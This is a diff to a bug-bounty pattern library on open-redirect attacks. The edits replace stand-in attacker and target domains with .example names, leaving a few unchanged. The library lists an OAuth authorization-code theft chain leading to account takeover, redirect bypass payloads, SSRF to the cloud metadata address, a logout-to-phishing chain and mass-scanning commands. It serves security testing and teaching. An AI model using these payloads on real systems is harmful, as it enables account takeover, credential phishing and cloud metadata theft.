@@ -7,18 +7,18 @@ Pattern library built from 28 public bug bounty reports.
 ## Pattern 1: Open Redirect → OAuth Auth Code Theft → ATO (Critical, $12,500)
 
 **Chain:**
-1. Found: `GET /redirect?url=https://evil.com` → redirects to evil.com
-2. OAuth configured: `redirect_uri` must be on `target.com` (wildcard: `https://target.com/*`)
+1. Found: `GET /redirect?url=https://evil.example` → redirects to evil.example
+2. OAuth configured: `redirect_uri` must be on `target.example` (wildcard: `https://target.example/*`)
 3. Crafted OAuth URL:
 
 ```
-https://target.com/oauth/authorize?
+https://target.example/oauth/authorize?
   response_type=code&
   client_id=CLIENT_ID&
-  redirect_uri=https://target.com/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com
+  redirect_uri=https://target.example/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com
 ```
 
-4. Victim clicks → auth code in redirect → `https://evil.com/?code=AUTH_CODE`
+4. Victim clicks → auth code in redirect → `https://evil.example/?code=AUTH_CODE`
 5. Attacker exchanges code for access token
 
 **Impact:** Full account takeover without any victim interaction beyond clicking a link.
@@ -28,9 +28,9 @@ https://target.com/oauth/authorize?
 ## Pattern 2: Open Redirect via Backslash (Low, $500)
 
 **Endpoint:** `GET /login?next=/dashboard`
-**Bypass:** `GET /login?next=\\evil.com`
+**Bypass:** `GET /login?next=\\evil.example`
 
-**Cause:** `next` value passed to `window.location` — browser on Windows interprets `\\evil.com` as `//evil.com`.
+**Cause:** `next` value passed to `window.location` — browser on Windows interprets `\\evil.example` as `//evil.example`.
 
 **Fix:** Validate that `next` is a relative path starting with `/` and no `//`.
 
@@ -38,19 +38,19 @@ https://target.com/oauth/authorize?
 
 ## Pattern 3: Open Redirect via @ Confusion (Low, $300)
 
-**URL:** `https://target.com/redirect?url=https://target.com@evil.com`
+**URL:** `https://target.example/redirect?url=https://target.example@evil.example`
 
-**Browser interpretation:** username=`target.com`, host=`evil.com` → redirects to evil.com.
+**Browser interpretation:** username=`target.example`, host=`evil.example` → redirects to evil.example.
 
 ---
 
 ## Pattern 4: Logout + Open Redirect → Phishing (Medium, $1,500)
 
-**Endpoint:** `GET /logout?returnTo=https://evil.com`
+**Endpoint:** `GET /logout?returnTo=https://evil.example`
 
-**Effect:** User logged out, then redirected to evil.com which shows a fake "session expired" login form.
+**Effect:** User logged out, then redirected to evil.example which shows a fake "session expired" login form.
 
-**Impact:** Victim re-enters credentials on attacker-controlled page that looks like target.com.
+**Impact:** Victim re-enters credentials on attacker-controlled page that looks like target.example.
 
 ---
 
@@ -70,10 +70,10 @@ https://target.com/oauth/authorize?
 
 **If app follows redirects server-side:**
 ```
-/fetch?url=https://attacker.com/redirect-to-metadata
+/fetch?url=https://attacker.example/redirect-to-metadata
 ```
 
-**Where attacker.com/redirect-to-metadata returns:**
+**Where attacker.example/redirect-to-metadata returns:**
 ```http
 HTTP/1.1 302 Found
 Location: http://169.254.169.254/latest/meta-data/
@@ -89,12 +89,12 @@ Location: http://169.254.169.254/latest/meta-data/
 
 **Vulnerable response:**
 ```json
-{"redirect_url": "https://target.com/dashboard?ref=USER_CONTROLLED_VALUE"}
+{"redirect_url": "https://target.example/dashboard?ref=USER_CONTROLLED_VALUE"}
 ```
 
 **If `ref` parameter is reflected in redirect_url construction without sanitization:**
 ```
-ref=https://evil.com
+ref=https://evil.example
 ```
 
 ---
@@ -103,14 +103,14 @@ ref=https://evil.com
 
 | Technique | Payload | Notes |
 |-----------|---------|-------|
-| Basic | `https://evil.com` | Most basic |
-| Protocol-relative | `//evil.com` | Scheme-less |
-| Backslash | `/\evil.com` | Windows browser compat |
-| At-sign | `https://target.com@evil.com` | RFC auth confusion |
+| Basic | `https://evil.example` | Most basic |
+| Protocol-relative | `//evil.example` | Scheme-less |
+| Backslash | `/\evil.example` | Windows browser compat |
+| At-sign | `https://target.example@evil.example` | RFC auth confusion |
 | Encoded slash | `%2Fevil.com` | URL encoding |
-| Null byte | `evil.com%00target.com` | Old PHP/CGI |
-| Whitespace | `evil.com%09` | Tab char |
-| Fragment | `https://evil.com#.target.com` | Fragment anchor |
+| Null byte | `evil.example%00target.com` | Old PHP/CGI |
+| Whitespace | `evil.example%09` | Tab char |
+| Fragment | `https://evil.example#.target.example` | Fragment anchor |
 
 ---
 
@@ -119,13 +119,13 @@ ref=https://evil.com
 ```bash
 # openredirex
 pip3 install openredirex
-openredirex -l recon/target/redirect-candidates.txt -p https://evil.com
+openredirex -l recon/target/redirect-candidates.txt -p https://evil.example
 
 # gf + qsreplace + httpx
 cat recon/target/urls.txt | gf redirect | \
-  qsreplace "https://evil.com" | \
-  httpx -follow-redirects -match-string "evil.com"
+  qsreplace "https://evil.example" | \
+  httpx -follow-redirects -match-string "evil.example"
 
 # nuclei
-nuclei -u https://target.com -t redirect/ -severity medium,high
+nuclei -u https://target.example -t redirect/ -severity medium,high
 ```
